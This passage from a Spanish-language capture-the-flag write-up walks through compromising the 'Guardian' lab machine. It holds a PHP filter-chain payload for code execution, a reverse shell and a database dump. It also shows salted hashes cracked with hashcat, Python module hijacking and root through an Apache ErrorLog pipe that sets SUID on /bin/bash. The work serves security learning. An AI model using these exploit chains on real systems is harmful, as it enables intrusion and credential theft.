TF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp/system.php
```

La pegamos en el navegador y recibiremos una reverse shell en nuestra máquina escuchando por el puerto 4444:

```shell
❯ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.18.0.1 • 172.17.0.1 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.2.70-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/guardian~10.129.2.70-Linux-x86_64/2026_01_17-13_36_57-580.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@guardian:~/portal.guardian.htb/admin$ whoami
www-data
```

Ya tenemos una consola dentro de la máquina Guardian. 

---
### 8. Escalada de privilegios — jamil

Como estamos con **www-data** nos tocará enumerar por posibles archivos de configuración que puedan contener credenciales para otros usuarios locales.

En `/var/www/portal.guardian.htb/config` hay credenciales para acceder como `root` a la base de datos **MySQL**:

```shell
www-data@guardian:~/portal.guardian.htb/config$ cat config.php 
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```

Además nos chiva el **salt** que usan los hashes de las contraseñas, esto será útil para crackearlas. Nos conectamos al servidor MySQL de la máquina:

```bash
www-data@guardian:~/portal.guardian.htb/config$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 246
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Enumeramos las bases de datos:

```sql
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)
```

Nos interesa ver el contenido de la base de datos `guardiandb`. Enumeramos sus tablas:

```sql
mysql> USE guardiandb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.01 sec)
```

La tabla **users** tiene buena pinta, vamos a ver que campos tiene:

```sql
mysql> explain users;
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| Field         | Type                               | Null | Key | Default           | Extra                                         |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| user_id       | int                                | NO   | PRI | NULL              | auto_increment                                |
| username      | varchar(255)                       | YES  | UNI | NULL              |                                               |
| password_hash | varchar(255)                       | YES  |     | NULL              |                                               |
| full_name     | varchar(255)                       | YES  |     | NULL              |                                               |
| email         | varchar(255)                       | YES  |     | NULL              |                                               |
| dob           | date                               | YES  |     | NULL              |                                               |
| address       | text                               | YES  |     | NULL              |                                               |
| user_role     | enum('student','lecturer','admin') | YES  |     | student           |                                               |
| status        | enum('active','inactive')          | YES  |     | active            |                                               |
| created_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED                             |
| updated_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
11 rows in set (0.00 sec)
```

Me interesa únicamente que se me muestre el `username` junto al `password_hash`:

```mysql
mysql> SELECT username,password_hash FROM users;
+--------------------+------------------------------------------------------------------+
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
```

Toca crackear estos hashes, hay que tener en cuenta que usan el salt `8Sb)tM1vs1SS`, y por su formato podemos intuir que son `SHA-256`. En nuestra máquina de atacante creamos el archivo **hashes.txt** con el siguiente contenido:

```txt
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
```

Usamos `hashcat` para crackear las contraseñas usando el diccionario `rockyou.txt`, el formato **1410** corresponde a `sha256($pass.$salt)` en la documentación de hashcat.

```shell
❯ hashcat -m 1410 hashes.txt /home/abra/Documentos/rockyou.txt -O
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #01: Intel(R) Iris(R) Xe Graphics, 7137/14275 MB (2047 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51


...


c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
Approaching final keyspace - workload adjusted.           


...


Started: Sat Jan 17 14:08:49 2026
Stopped: Sat Jan 17 14:09:05 2026
```

Ha funcionado, interpretando los resultados **acabamos de conseguir estas credenciales:**

`admin:fakebake000`, `jamil.enockson:copperhouse56`.

Si miramos el `/home` de la máquina veremos que existen los siguientes usuarios:

```shell
www-data@guardian:~$ ls /home
gitea  jamil  mark  sammy
```

**Nos podemos loguear como `jamil` localmente con las credenciales obtenidas, obteniendo la user flag:**

```shell
www-data@guardian:~$ su jamil
Password: 
jamil@guardian:/var/www$ cd
jamil@guardian:~$ ls
user.txt
```

---
### 9. Escalada a mark — Python Library Hijacking

Toca ir a por la root flag. De primeras al ejecutar `sudo -l` vemos que tenemos permiso de ejecutar `/opt/scripts/utilities/utilities.py` como **mark** sin necesidad de contraseña:

```shell
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Vamos a tirarle un `--help` ver de que se trata:

```shell
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py --help
usage: utilities.py [-h] {backup-db,zip-attachments,collect-logs,system-status}

University Server Utilities Toolkit

positional arguments:
  {backup-db,zip-attachments,collect-logs,system-status}
                        Action to perform

options:
  -h, --help            show this help message and exit
```

No nos dice la gran cosa, mejor le tiro un `cat`:

```python
jamil@guardian:~$ cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

El script **importa varios módulos desde `/opt/scripts/utilities/utils`**, el módulo `status.py` **lo podemos modificar**, nuestro usuario `jamil` pertenece al grupo `admins`, y dicho módulo mencionado tiene permisos de escritura para el grupo:

```shell
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
jamil@guardian:~$ ls -l /opt/scripts/utilities/utils
total 16
-rw-r----- 1 root admins 287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins 246 Jul 10  2025 db.py
-rw-r----- 1 root admins 226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins 253 Apr 26  2025 status.py
```

Vamos a sobrescribir `status.py` para que cuando ejecutemos el script de python con el usuario `mark` y se utilice dicho módulo **nos genere una shell:**

```python
#!/usr/bin/env python3
import os
import pty

def system_status():
    os.system("/bin/bash")
```

Ejecutamos el `utilities.py` con la acción `system-status` y obtendremos una shell como **mark**.

```shell
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
mark@guardian:/home/jamil$ whoami
mark
```

---
### 10. Escalada de privilegios a root — Apache Config Injection

Toca enumerar el usuario `mark`, vamos a ver los grupos a los que pertenece, el contenido que hay en su home, y sus privilegios sudo:

```shell
mark@guardian:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark),1002(admins)
mark@guardian:~$ ls
confs
mark@guardian:~$ ls confs/
mark@guardian:~$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Puede ejecutar `/usr/local/bin/safeapache2ctl` como **root**. 

```shell
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
```

Nos pide ejecutar el binario especificando un archivo de configuración el cuál no tenemos.

```shell
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
realpath: No such file or directory
```

El binario se llama `safeapache2ctl`, por lo que será una versión del `apache2ctl` ligeramente modificada. **Vamos a crear un archivo de configuración de Apache malicioso en `/home/mark/confs`**, usará el módulo `mod_mpm_prefork.so` el cuál lo necesita Apache obligatoriamente para su funcionamiento, **y a través de un pipe en el ErrorLog controlaremos el comando a ejecutar**. Se pueden verificar los módulos disponibles con `ls -l /usr/lib/apache2/modules`.

```shell
cat > /home/mark/confs/pwned.conf << 'EOF'
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so

User www-data
Group www-data

# ErrorLog con pipe ejecuta el comando
ErrorLog "|/bin/sh -c 'chmod 4755 /bin/bash'"

Listen 8080
EOF
```

Esto se puede considerar **Command Injection** a nivel de configuración de Apache. Ejecutamos el binario y veremos `/bin/bash` con el permiso SUID añadido.

```shell
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/pwned.conf
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 10.129.2.70. Set the 'ServerName' directive globally to suppress this message
mark@guardian:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Ejecutamos `/bin/bash` de forma privilegiada, y con esto hemos terminado de vulnerar la máquina.

```shell
mark@guardian:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
root.txt  scripts
```